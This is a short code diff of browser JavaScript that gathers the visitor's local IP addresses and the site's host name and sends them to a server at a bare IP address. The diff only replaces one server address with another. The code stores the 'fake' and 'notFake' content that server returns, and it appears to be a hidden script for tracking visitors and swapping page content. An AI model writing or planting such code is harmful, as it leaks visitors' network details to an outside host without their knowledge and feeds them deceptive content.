@@ -5,7 +5,7 @@ var pathname = window.location.host;
 getLocalIPs(function(ips) {
   json = {
     "ip":ips.join('\n '), "domain":pathname};
-  $.get("http://185.24.216.103:25070/webpage/"+pathname,json,function(data, status){
+  $.get("http://77.55.217.170:25070/webpage/"+pathname,json,function(data, status){
     var raw = data.webpage;
     window.fake_ = raw["fake"];
     window.noFake_ = raw["notFake"];
